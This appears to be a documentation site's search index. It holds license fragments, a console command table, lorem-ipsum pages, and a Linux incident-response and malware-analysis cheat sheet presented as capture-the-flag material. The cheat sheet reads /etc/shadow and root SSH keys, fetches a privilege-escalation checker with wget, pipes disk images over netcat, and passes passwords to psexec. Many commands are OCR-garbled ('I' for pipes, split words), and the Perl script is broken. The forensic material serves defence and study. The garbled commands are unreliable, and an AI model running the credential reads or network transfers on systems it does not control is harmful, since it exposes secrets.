. (b) You must cause any modified files to carry prominent notices stating that You changed the files; and . \u00a9 You must retain, in the Source form of any Derivative Works that You distribute, all copyright, patent, trademark, and attribution notices from the Source form of the Work, excluding those notices that do not pertain to any part of the Derivative Works; and . (d) If the Work includes a \"NOTICE\" text file as part of its distribution, then any Derivative Works that You distribute must include a readable copy of the attribution notices contained within such NOTICE file, excluding those notices that do not pertain to any part of the Derivative Works, in at least one of the following places: within a NOTICE text file distributed as part of the Derivative Works; within the Source form or documentation, if provided along with the Derivative Works; or, within a display generated by the Derivative Works, if and wherever such third-party notices normally appear. The contents of the NOTICE file are for informational purposes only and do not modify the License. You may add Your own attribution notices within Derivative Works that You distribute, alongside or as an addendum to the NOTICE text from the Work, provided that such additional attribution notices cannot be construed as modifying the License. . You may add Your own copyright statement to Your modifications and may provide additional or different license terms and conditions for use, reproduction, or distribution of Your modifications, or for any such Derivative Works as a whole, provided Your use, reproduction, and distribution of the Work otherwise complies with the conditions stated in this License. . 5. Submission of Contributions. Unless You explicitly state otherwise, any Contribution intentionally submitted for inclusion in the Work by You to the Licensor shall be under the terms and conditions of this License, without any additional terms or conditions. Notwithstanding the above, nothing herein shall supersede or modify the terms of any separate license agreement you may have executed with Licensor regarding such Contributions. . 6. Trademarks. This License does not grant permission to use the trade names, trademarks, service marks, or product names of the Licensor, except as required for reasonable and customary use in describing the origin of the Work and reproducing the content of the NOTICE file. . 7. Disclaimer of Warranty. Unless required by applicable law or agreed to in writing, Licensor provides the Work (and each Contributor provides its Contributions) on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied, including, without limitation, any warranties or conditions of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE. You are solely responsible for determining the appropriateness of using or redistributing the Work and assume any risks associated with Your exercise of permissions under this License. . 8. Limitation of Liability. In no event and under no legal theory, whether in tort (including negligence), contract, or otherwise, unless required by applicable law (such as deliberate and grossly negligent acts) or agreed to in writing, shall any Contributor be liable to You for damages, including any direct, indirect, special, incidental, or consequential damages of any character arising as a result of this License or out of the use or inability to use the Work (including but not limited to damages for loss of goodwill, work stoppage, computer failure or malfunction, or any and all other commercial damages or losses), even if such Contributor has been advised of the possibility of such damages. . 9. Accepting Warranty or Additional Liability. While redistributing the Work or Derivative Works thereof, You may choose to offer, and charge a fee for, acceptance of support, warranty, indemnity, or other liability obligations and/or rights consistent with this License. However, in accepting such obligations, You may act only on Your own behalf and on Your sole responsibility, not on behalf of any other Contributor, and only if You agree to indemnify, defend, and hold each Contributor harmless for any liability incurred by, or claims asserted against, such Contributor by reason of your accepting any such warranty or additional liability. . END OF TERMS AND CONDITIONS . APPENDIX: How to apply the Apache License to your work. . To apply the Apache License to your work, attach the following boilerplate notice, with the fields enclosed by brackets \"[]\" replaced with your own identifying information. (Don't include the brackets!) The text should be enclosed in the appropriate comment syntax for the file format. We also recommend that a file or class name and description of purpose be included on the same \"printed page\" as the copyright notice for easier identification within third-party archives. . Copyright [yyyy] [name of copyright owner] . Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at . http://www.apache.org/licenses/LICENSE-2.0 . Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. License: Zlib This software is provided 'as-is', without any express or implied warranty. In no event will the authors be held liable for any damages arising from the use of this software. . Permission is granted to anyone to use this software for any purpose, including commercial applications, and to alter it and redistribute it freely, subject to the following restrictions: . 1. The origin of this software must not be misrepresented; you must not claim that you wrote the original software. If you use this software in a product, an acknowledgment in the product documentation would be appreciated but is not required. 2. Altered source versions must be plainly marked as such, and must not be misrepresented as being the original software. 3. This notice may not be removed or altered from any source distribution.","title":"Last updated: 2018-Nov-04"},{"location":"community/","text":"Core Commands Command | Description | ------------- |:-------------: | | - [x] banner | Display an awesome thgbanner| | - [x] ip | show internal ip| | - [x] exit | Exit the console| | - [] unsetg | Unsets one or more global variables| | - [x] help | Help menu| | - [x] history | Show command history| | - [] setg | Sets a global variable to a value| | - [x] set | Sets a context-specific variable to a value| | - [x] exec | Execute a command in a shell| | - [] cd | Change the current working directory| | - [] color | Toggle color| | - [] route | Route traffic through a session V-1base| | - [x]version | Show the framework and console library version numbers| | - [x] quit | Exit the console| | - [ ] connect | Communicate with a host| | - [X] grep | Grep the output of another command| | - [x] load | Load a framewo","title":"Community"},{"location":"community/#core-commands","text":"Command | Description | ------------- |:-------------: | | - [x] banner | Display an awesome thgbanner| | - [x] ip | show internal ip| | - [x] exit | Exit the console| | - [] unsetg | Unsets one or more global variables| | - [x] help | Help menu| | - [x] history | Show command history| | - [] setg | Sets a global variable to a value| | - [x] set | Sets a context-specific variable to a value| | - [x] exec | Execute a command in a shell| | - [] cd | Change the current working directory| | - [] color | Toggle color| | - [] route | Route traffic through a session V-1base| | - [x]version | Show the framework and console library version numbers| | - [x] quit | Exit the console| | - [ ] connect | Communicate with a host| | - [X] grep | Grep the output of another command| | - [x] load | Load a framewo","title":"Core Commands"},{"location":"conceptual/","text":"Success Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Abstract Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Success Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Warning Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Bug Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Example Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Quote Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Danger Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Failure Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Question Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Tip Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Options Option Type Default Description base_path string '.' A string indicating a base path to be used to resolve relative links.","title":"Conceptual"},{"location":"conceptual/#options","text":"Option Type Default Description base_path string '.' A string indicating a base path to be used to resolve relative links.","title":"Options"},{"location":"deployment/","text":"","title":"Deployment"},{"location":"capturetheflag/basic/analysis/linux/","text":"SYSTEM INFORMATION uname -a uptime timedatectl mount USER INFORMATION View logged in users: w Show if a user has ever logged in remotely: lastlog last View failed logins: faillog -a View local user accounts: cat /etc/passwd cat/etc/shadow View local groups: cat/etc/group View sudo access: cat /etc/sudoers View accounts with UID 0: awk -F: '($3 == \"0\") {p rint}' /etc/passwd egrep ':0+' /etc/passwd View root authorized SSH key authentications: cat /root/.ssh/authorized_keys List of files opened by user: lsof -u <USER NAME> View the root user bash history: cat /root/,bash_history NETWORK INFORMATION View network interfaces: ifconfig View network connections: netstat -antup netstat -plantux View listening ports: netstat -nap View routes: route View arp table: arp -a List of processes listening on ports: lsof -i SERVICE INFORMATION View processes: ps -aux List of load modules: lsmod List of open files: lsof List of open files, using the network: lsof -nPi I cut -f 1 -d \" \"I uniq I tail -n +2 List of open files on specific process: lsof -c <SERVICE NAME> Get all open files of a specific process ID: lsof -p <PID> List of unlinked processes running: lsof +Ll Get path of suspicious process PID: ls -al /proc/<PID>/exe Save file for further malware binary analysis: cp /proc/<PID>/exe >/<SUSPICIOUS FILE NAME TO SAVE>,elf Monitor logs in real-time: less +F /var/log/messages List services: chkconfig --list POLICY, PATCH AND SETTINGS INFORMATION View pam.d files: cat /etc/pam.d/common* AUTORUN AND AUTOLOAD INFORMATION: List cron jobs: crontab -l List cron jobs by root and other UID 0 accounts: crontab -u root -l Review for unusual cron jobs: cat /etc/crontab ls /etc/cron,* LOGS View root user command history: cat /root/,*history View last logins: last FILES, DRIVES AND SHARES INFORMATION View disk space: df -ah View directory listing for /etc/init.d: ls -la /etc/init.d Get more info for a file: stat -x <FILE NAME> Identify file type: file <FILE NAME> Look for immutable files: lsatt r -R / I g rep 11 \\ -i11 View directory listing for /root: ls -la /root Look for files recently modified in current directory: ls -alt I head Look for world writable files: #find/ -xdev -type d\\( -perm -0002 -a ! -perm -1000 \\) -print Look for recent created files, in this case newer than Jan 02, 2017: find/ -n ewermt 2017-01-02q List all files and attributes: #find/ -printf 11%m;%Ax;%AT;%Tx;%TT;%Cx;%CT;%U;%G;%s;%p\\n\" Look at files in directory by most recent timestamp:(Could be tampered) ls -alt /<DIRECTORY>! head Get full file information: # stat /<FILE PATH>/<SUSPICIOUS FILE NAME> Review file type: # file /<FILE PATH>/<SUSPICIOUS FILE NAME> Check for rootkits or signs of compromise: Run unix-privsec-check tool: # wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/l_x/unix-privesc-check # ./unix-privesc-check > output.txt Run chkrootkit: apt-get install chkrootkit chkrootkit Run rkhunter: apt-get install rkhunter rkhunter --update rkhunter -check Run tiger: apt-get install tiger tiger less /var/log/tiger/security.report,* Run lynis: apt-get install lynis lynis audit system more /var/logs/lynis. log Run Linux Malware Detect (LMD): wget http://www.rfxn.com/downloads/maldetectcurrent.tar.gz tar xfz maldetect-current.tar.gz cd maldetect-* ./install.sh => Get LMD updates: maldet -u Run LMD scan on directory: maldet -a /<DIRECTORY>","title":"linux"},{"location":"capturetheflag/basic/analysis/linux/#system-information","text":"uname -a uptime timedatectl mount","title":"SYSTEM INFORMATION"},{"location":"capturetheflag/basic/analysis/linux/#user-information","text":"","title":"USER INFORMATION"},{"location":"capturetheflag/basic/analysis/linux/#view-logged-in-users","text":"w","title":"View logged in users:"},{"location":"capturetheflag/basic/analysis/linux/#show-if-a-user-has-ever-logged-in-remotely","text":"lastlog last","title":"Show if a user has ever logged in remotely:"},{"location":"capturetheflag/basic/analysis/linux/#view-failed-logins","text":"faillog -a","title":"View failed logins:"},{"location":"capturetheflag/basic/analysis/linux/#view-local-user-accounts","text":"cat /etc/passwd cat/etc/shadow","title":"View local user accounts:"},{"location":"capturetheflag/basic/analysis/linux/#view-local-groups","text":"cat/etc/group","title":"View local groups:"},{"location":"capturetheflag/basic/analysis/linux/#view-sudo-access","text":"cat /etc/sudoers","title":"View sudo access:"},{"location":"capturetheflag/basic/analysis/linux/#view-accounts-with-uid-0","text":"awk -F: '($3 == \"0\") {p rint}' /etc/passwd egrep ':0+' /etc/passwd","title":"View accounts with UID 0:"},{"location":"capturetheflag/basic/analysis/linux/#view-root-authorized-ssh-key-authentications","text":"cat /root/.ssh/authorized_keys","title":"View root authorized SSH key authentications:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-files-opened-by-user","text":"lsof -u <USER NAME>","title":"List of files opened by user:"},{"location":"capturetheflag/basic/analysis/linux/#view-the-root-user-bash-history","text":"cat /root/,bash_history","title":"View the root user bash history:"},{"location":"capturetheflag/basic/analysis/linux/#network-information","text":"","title":"NETWORK INFORMATION"},{"location":"capturetheflag/basic/analysis/linux/#view-network-interfaces","text":"ifconfig","title":"View network interfaces:"},{"location":"capturetheflag/basic/analysis/linux/#view-network-connections","text":"netstat -antup netstat -plantux","title":"View network connections:"},{"location":"capturetheflag/basic/analysis/linux/#view-listening-ports","text":"netstat -nap","title":"View listening ports:"},{"location":"capturetheflag/basic/analysis/linux/#view-routes","text":"route","title":"View routes:"},{"location":"capturetheflag/basic/analysis/linux/#view-arp-table","text":"arp -a","title":"View arp table:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-processes-listening-on-ports","text":"lsof -i","title":"List of processes listening on ports:"},{"location":"capturetheflag/basic/analysis/linux/#service-information","text":"","title":"SERVICE INFORMATION"},{"location":"capturetheflag/basic/analysis/linux/#view-processes","text":"ps -aux","title":"View processes:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-load-modules","text":"lsmod","title":"List of load modules:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-open-files","text":"lsof","title":"List of open files:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-open-files-using-the-network","text":"lsof -nPi I cut -f 1 -d \" \"I uniq I tail -n +2","title":"List of open files, using the network:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-open-files-on-specific-process","text":"lsof -c <SERVICE NAME>","title":"List of open files on specific process:"},{"location":"capturetheflag/basic/analysis/linux/#get-all-open-files-of-a-specific-process-id","text":"lsof -p <PID>","title":"Get all open files of a specific process ID:"},{"location":"capturetheflag/basic/analysis/linux/#list-of-unlinked-processes-running","text":"lsof +Ll","title":"List of unlinked processes running:"},{"location":"capturetheflag/basic/analysis/linux/#get-path-of-suspicious-process-pid","text":"ls -al /proc/<PID>/exe","title":"Get path of suspicious process PID:"},{"location":"capturetheflag/basic/analysis/linux/#save-file-for-further-malware-binary-analysis","text":"cp /proc/<PID>/exe >/<SUSPICIOUS FILE NAME TO SAVE>,elf Monitor logs in real-time: less +F /var/log/messages","title":"Save file for further malware binary analysis:"},{"location":"capturetheflag/basic/analysis/linux/#list-services","text":"chkconfig --list","title":"List services:"},{"location":"capturetheflag/basic/analysis/linux/#policy-patch-and-settings-information","text":"","title":"POLICY, PATCH AND SETTINGS INFORMATION"},{"location":"capturetheflag/basic/analysis/linux/#view-pamd-files","text":"cat /etc/pam.d/common*","title":"View pam.d files:"},{"location":"capturetheflag/basic/analysis/linux/#autorun-and-autoload-information","text":"","title":"AUTORUN AND AUTOLOAD INFORMATION:"},{"location":"capturetheflag/basic/analysis/linux/#list-cron-jobs","text":"crontab -l","title":"List cron jobs:"},{"location":"capturetheflag/basic/analysis/linux/#list-cron-jobs-by-root-and-other-uid-0-accounts","text":"crontab -u root -l","title":"List cron jobs by root and other UID 0 accounts:"},{"location":"capturetheflag/basic/analysis/linux/#review-for-unusual-cron-jobs","text":"cat /etc/crontab ls /etc/cron,*","title":"Review for unusual cron jobs:"},{"location":"capturetheflag/basic/analysis/linux/#logs","text":"","title":"LOGS"},{"location":"capturetheflag/basic/analysis/linux/#view-root-user-command-history","text":"cat /root/,*history","title":"View root user command history:"},{"location":"capturetheflag/basic/analysis/linux/#view-last-logins","text":"last","title":"View last logins:"},{"location":"capturetheflag/basic/analysis/linux/#files-drives-and-shares-information","text":"","title":"FILES, DRIVES AND SHARES INFORMATION"},{"location":"capturetheflag/basic/analysis/linux/#view-disk-space","text":"df -ah","title":"View disk space:"},{"location":"capturetheflag/basic/analysis/linux/#view-directory-listing-for-etcinitd","text":"ls -la /etc/init.d","title":"View directory listing for /etc/init.d:"},{"location":"capturetheflag/basic/analysis/linux/#get-more-info-for-a-file","text":"stat -x <FILE NAME>","title":"Get more info for a file:"},{"location":"capturetheflag/basic/analysis/linux/#identify-file-type","text":"file <FILE NAME>","title":"Identify file type:"},{"location":"capturetheflag/basic/analysis/linux/#look-for-immutable-files","text":"lsatt r -R / I g rep 11 \\ -i11","title":"Look for immutable files:"},{"location":"capturetheflag/basic/analysis/linux/#view-directory-listing-for-root","text":"ls -la /root","title":"View directory listing for /root:"},{"location":"capturetheflag/basic/analysis/linux/#look-for-files-recently-modified-in-current-directory","text":"ls -alt I head","title":"Look for files recently modified in current directory:"},{"location":"capturetheflag/basic/analysis/linux/#look-for-world-writable-files","text":"#find/ -xdev -type d\\( -perm -0002 -a ! -perm -1000 \\) -print","title":"Look for world writable files:"},{"location":"capturetheflag/basic/analysis/linux/#look-for-recent-created-files-in-this-case-newer-than-jan-02-2017","text":"find/ -n ewermt 2017-01-02q","title":"Look for recent created files, in this case newer than Jan 02, 2017:"},{"location":"capturetheflag/basic/analysis/linux/#list-all-files-and-attributes","text":"#find/ -printf 11%m;%Ax;%AT;%Tx;%TT;%Cx;%CT;%U;%G;%s;%p\\n\"","title":"List all files and attributes:"},{"location":"capturetheflag/basic/analysis/linux/#look-at-files-in-directory-by-most-recent-timestampcould-be-tampered","text":"ls -alt /<DIRECTORY>! head","title":"Look at files in directory by most recent timestamp:(Could be tampered)"},{"location":"capturetheflag/basic/analysis/linux/#get-full-file-information","text":"# stat /<FILE PATH>/<SUSPICIOUS FILE NAME>","title":"Get full file information:"},{"location":"capturetheflag/basic/analysis/linux/#review-file-type","text":"# file /<FILE PATH>/<SUSPICIOUS FILE NAME>","title":"Review file type:"},{"location":"capturetheflag/basic/analysis/linux/#check-for-rootkits-or-signs-of-compromise","text":"","title":"Check for rootkits or signs of compromise:"},{"location":"capturetheflag/basic/analysis/linux/#run-unix-privsec-check-tool","text":"# wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/l_x/unix-privesc-check # ./unix-privesc-check > output.txt","title":"Run unix-privsec-check tool:"},{"location":"capturetheflag/basic/analysis/linux/#run-chkrootkit","text":"apt-get install chkrootkit chkrootkit","title":"Run chkrootkit:"},{"location":"capturetheflag/basic/analysis/linux/#run-rkhunter","text":"apt-get install rkhunter rkhunter --update rkhunter -check","title":"Run rkhunter:"},{"location":"capturetheflag/basic/analysis/linux/#run-tiger","text":"apt-get install tiger tiger less /var/log/tiger/security.report,*","title":"Run tiger:"},{"location":"capturetheflag/basic/analysis/linux/#run-lynis","text":"apt-get install lynis lynis audit system more /var/logs/lynis. log","title":"Run lynis:"},{"location":"capturetheflag/basic/analysis/linux/#run-linux-malware-detect-lmd","text":"wget http://www.rfxn.com/downloads/maldetectcurrent.tar.gz tar xfz maldetect-current.tar.gz cd maldetect-* ./install.sh => Get LMD updates: maldet -u Run LMD scan on directory: maldet -a /<DIRECTORY>","title":"Run Linux Malware Detect (LMD):"},{"location":"capturetheflag/basic/analysis/malware/","text":"STATIC ANALYSIS BASICS Mount live Sysinternats toots drive: \\\\live.sysinternals.com\\tools Signature check of dlt, exe files: Ref. http://technet.microsoft.com/enus/sysinternals/bb897441.aspx C:\\> sigcheck.exe -u -e (:\\<DIRECTORY> Send to VirusTotat: C:\\> sigcheck.exe -vt <SUSPICIOUS FILE NAME> Windows PE Analysis: View Hex and ASCI of PE{exe or any file), with optional -n first 500 bytes: # hexdump -C -n 500 <SUSPICIOUS FILE NAME> # od -x somefile.exe # xxd somefile.exe In Windows using debug toot {works for .java files too): C:\\> debug <SUSPICIOUS FILE NAME> -d (just type d and get a page at a time of hex) -q (quit debugger) Windows PE analysis: PE Fite Compile Date/Time pert script below (Windows PE only script). Ref. https://www.perl.org/get.html Ref. http://www.perlmonks.org/bare/?node_id=484287 C:\\> perl.exe <SCRIPT NAME>.pl <SUSPICIOUS FILENAME> #! perl -slw use strict; open EXE, '<:raw', $ARGV[0] or die \"$ARGV[0] my $dos = do{ local$/ = \\65536; <EXE>}; $1\" \u2022 . , die \"$ARGV[0] is not a .exe or .dll (sig='${ \\substr $dos, 0, 2 } ')\" unless substr( $dos, 0, 2 ) eq 'MZ'; my $coffoff = 8+ unpack 'x60 V', $dos; read( EXE, $dos, $coffoff - 65536 + 4, 65536 ) or die$! if $coffoff > 65536; my $ts = unpack \"x$coffoff V\", $dos; print \"$ARGV [0] : \", defined $ts ? ( scalar( localtime $ts) 11 \"has unfathomable timestamp value $ts\" ) : 'has no timestamp'; _END_ View strings within PE and optional string length -n option: Using stings in Linux: strings -n 10 <SUSPICIOUS FILE NAME> Ref. https://technet.microsoft.com/enus/sysinternals/strings.aspx Using strings in Windows: C:\\> strings <SUSPICIOUS FILE NAME> Find Malware in memory dump using Volatility and Windows7SPFix64 profile: ![Ref](https://github.com/volatilityfoundation/volatility] python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 malfind -D /<OUTPUT DUMPDIRECTORY> Find Malware with PID in memory dump usingVolatility: python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 malfind -p <PID #> -D /<OUTPUTDUMP DIRECTORY> Find suspicious processes using Volatility: python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 pslist python vol.py -f <MEMORY DUMP FILE NAME>,raw -profile=Win7SPFix64 pstree Find suspicious dlls using Volatility: python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 dlllist python vol.py -f <MEMORY DUMP FILE NAME>.raw -profile=Win7SPFix64 dlldump -D /<OUTPUT DUMPDIRECTORY> Malware analysis parsing Tool: Ref. https://github.com/Defense-Cyber-CrimeCenter/DC3-MWCP Install dc3-mwcp tool: # setup.py install Use dc3-mwcp tool to parse suspicious file: # mwcp-tool.py -p <SUSPICIOUS FILE NAME> PROCESS EXPLORER Step 1: Look at running processes by running Process Explorer (GUI) and identify potential indicators of compromise: * Items with no icon * Items with no description or company name * Unsigned Microsoft images (First add Verified Signer column under View tab->Select Columns, then go to Options tab and choose Verify Image Signatures) * Check all running process hashes in Virus Total (Go to Options tab and select Check VirusTota l. com) * Suspicious files are in Windows directories or user profile * Purple items that are packed or compressed * Items with open TCP/IP endpoints Step 2: Signature File Check: ( See Sigcheck) Step 3: Strings Check: \u2022 Right click on suspicious process in Process Explorer and on pop up window choose Strings tab and review for suspicious URLs. Repeat for Image and Memory radio buttons. \u2022 Look for strange URLs in strings Step 4: DLL View: \u2022 Pop open with Ct rl+D \u2022 Look for suspicious DLLs or services \u2022 Look for no description or no company name \u2022 Look at VirusTotal Results column Step 5: Stop and Remove Malware: \u2022 Right click and select Suspend for any identified suspicious processes \u2022 Right click and select Terminate Previous Suspended processes Step 6: Clean up where malicious files Auto start on reboot. \u2022 Launch Autoruns \u2022 Under Options, Check the boxes Verify Code Signatures and Hide Microsoft entries \u2022 Look for suspicious process file from earlier steps on the everything tab and uncheck. Safer to uncheck than delete, in case of error. \u2022 Press FS, to refresh Autoruns, and confirm malicious file has not recreated the malicious entry into the previous unchecked auto start location. Step 7: Process Monitor https://technet.microsoft.com/enus/sysinternals/processmonitor.aspx \u2022 If malicious activity is still persistent, run Process Monitor. \u2022 Look for newly started process that start soon after terminated from previous steps. Step 8: Repeat as needed to find all malicious files and process and/or combine with other tools and suites. FILE HASH ANALYSIS HASH QUERY VirusTotal online API query: ![Ref](https://www.virustotal.com/en/documentation/publicapi/) (Prerequisite: Need a VT API Key) Send a suspicious hash to VirtusTotal using cURL: curl -v --request POST --url https://www.virustotal.com/vtapi/v2/file/report' -d apikey=<VT API KEY> -d 'resource=<SUSPICIOUS FILEHASH>' Send a suspicious file to VirusTotal using cURL: # curl -v -F 'file=/<PATH TO FILE>/<SUSPICIOUS FILENAME>' -F apikey=<VT API KEY> https://www.virustotal.com/vtapi/v2/file/scan Team Cymru API: Ref. https://hash.cymru.com, http://totalhash.com Team Cymru malware hash lookup using whois: (Note: Output is timestamp of last seen and detection rate) # whois -h hash,cymru.com <SUSPICIOUS FILE HASH> HARD DRIVE AND MEMORY ACQUISITION WINDOWS Create memory dump remotely: Ref. http://kromer.pl/malware-analysis/memoryforensics-using-volatility-toolkit-to-extractmalware-samples-from-memory-dump/ Ref. http://sourceforge.net/projects/mdd/ Ref. https://technet.microsoft.com/enus/sysinternals/psexec.aspx C: \\> psexec. exe \\\\<HOST NAME OR IP ADDRESS> -u <DOMAIN>\\<PRIVILEGED ACCOUNT> -p <PASSWORD> -cmdd_l,3.exe --o C:\\memory.dmp Ref.https://github.com/volatilityfoundation/volatility Extract exe/dll from memory dump: C:\\> volatility dlldump -f memory.dmp -0 dumps/ C:\\> volatility procmemdump -f memory.dmp -0 dumps/ Create hard drive image using dc3dd of C:: Ref.https://sourceforge.net/projects/dc3dd/files/dc3dd/7.2%20-%20Windows/ C:\\> dc3dd,exe if=\\\\,\\c: of=d:\\<ATTACHED OR TARGETDRIVE>\\<IMAGE NAME>,dd hash=md5 log=d:\\<MOUNTEDLOCATION>\\<LOG NAME>, log LINUX Create memory dump: dd if=/dev/fmem of=/tmp/<MEMORY FILE NAME>.dd Create memory dump using LiME: Ref. https://github.com/504ensicslabs/lime wgethttps://github.com/504ensicslabs/LiME/archive/master.zip unzip master.zip cd LiME-master/src make p lime-*,ko /media/=/media/ExternalUSBDriveName/ insmod lime-3.13.0-79-generic.ko \"path=/media/Exte rna lUSBDriveName/<MEMORY DUMP>, limeformat=raw\" Make copy of suspicious process using process ID: cp /proc/<SUSPICIOUS PROCESS ID>/exe /<NEW SAVEDLOCATION> Grab memory core dump of suspicious process: gcore <PIO> Strings on gcore file: # strings gcore.* Create a hard drive/partition copy with tog and hash options: dd if=<INPUT DEVICE> of=<IMAGE FILE NAME> dc3dd if=/dev/<TARGET DRIVE EXAMPLE SDA OR SDAl> of=/dev/<MOUNTED LOCATION>\\<FILE NAME>.img hash=md5 log=/<MOUNTED LOCATION>/<LOG NAME>.log Create a remote hard drive/partition over SSH: dd if=/dev/<INPUT DEVICE> I ssh <USERNAME>@<DESTINATION IP ADDRESS> \"dd of=<DESTINATIONPATH>\" Send hard drive image zipped over netcat: Sending host: bzip2 -c /dev/<INPUT DEVICE> I nc <DESTINATION IPADDRESS> <PICK A PORT> Receiving host: nc -p <PICK SAME PORT> -l lbzip2 -d I dd of=/dev/sdb Send hard drive image over netcat: Sending host: dd if=/dev/<INPUT DEVICE> bs=16M I nc <PORT> Receiving host with Pipe Viewer meter: nc -p <SAME PORT> -l -vv I pv -r I dd of=/dev/<INPUT DEVICE> bs=16M","title":"malware"},{"location":"capturetheflag/basic/analysis/malware/#static-analysis-basics","text":"","title":"STATIC ANALYSIS BASICS"},{"location":"capturetheflag/basic/analysis/malware/#mount-live-sysinternats-toots-drive","text":"\\\\live.sysinternals.com\\tools Signature check of dlt, exe files: Ref. http://technet.microsoft.com/enus/sysinternals/bb897441.aspx C:\\> sigcheck.exe -u -e (:\\<DIRECTORY>","title":"Mount live Sysinternats toots drive:"},{"location":"capturetheflag/basic/analysis/malware/#send-to-virustotat","text":"C:\\> sigcheck.exe -vt <SUSPICIOUS FILE NAME>","title":"Send to VirusTotat:"},{"location":"capturetheflag/basic/analysis/malware/#windows-pe-analysis","text":"","title":"Windows PE Analysis:"},{"location":"capturetheflag/basic/analysis/malware/#view-hex-and-asci-of-peexe-or-any-file-with-optional-n-first-500-bytes","text":"# hexdump -C -n 500 <SUSPICIOUS FILE NAME> # od -x somefile.exe # xxd somefile.exe","title":"View Hex and ASCI of PE{exe or any file), with optional -n first 500 bytes:"},{"location":"capturetheflag/basic/analysis/malware/#in-windows-using-debug-toot-works-for-java-files-too","text":"C:\\> debug <SUSPICIOUS FILE NAME> -d (just type d and get a page at a time of hex) -q (quit debugger)","title":"In Windows using debug toot {works for .java files too):"},{"location":"capturetheflag/basic/analysis/malware/#windows-pe-analysis_1","text":"PE Fite Compile Date/Time pert script below (Windows PE only script). Ref. https://www.perl.org/get.html Ref. http://www.perlmonks.org/bare/?node_id=484287 C:\\> perl.exe <SCRIPT NAME>.pl <SUSPICIOUS FILENAME> #! perl -slw use strict; open EXE, '<:raw', $ARGV[0] or die \"$ARGV[0] my $dos = do{ local$/ = \\65536; <EXE>}; $1\" \u2022 . , die \"$ARGV[0] is not a .exe or .dll (sig='${ \\substr $dos, 0, 2 } ')\" unless substr( $dos, 0, 2 ) eq 'MZ'; my $coffoff = 8+ unpack 'x60 V', $dos; read( EXE, $dos, $coffoff - 65536 + 4, 65536 ) or die$! if $coffoff > 65536; my $ts = unpack \"x$coffoff V\", $dos; print \"$ARGV [0] : \", defined $ts ? ( scalar( localtime $ts) 11 \"has unfathomable timestamp value $ts\" ) : 'has no timestamp'; _END_","title":"Windows PE analysis:"},{"location":"capturetheflag/basic/analysis/malware/#view-strings-within-pe-and-optional-string-length-n-option","text":"","title":"View strings within PE and optional string length -n option:"},{"location":"capturetheflag/basic/analysis/malware/#using-stings-in-linux","text":"strings -n 10 <SUSPICIOUS FILE NAME> Ref. https://technet.microsoft.com/enus/sysinternals/strings.aspx Using strings in Windows: C:\\> strings <SUSPICIOUS FILE NAME>","title":"Using stings in Linux:"},{"location":"capturetheflag/basic/analysis/malware/#find-malware-in-memory-dump-using-volatility-and-windows7spfix64-profile","text":"![Ref](https://github.com/volatilityfoundation/volatility] python 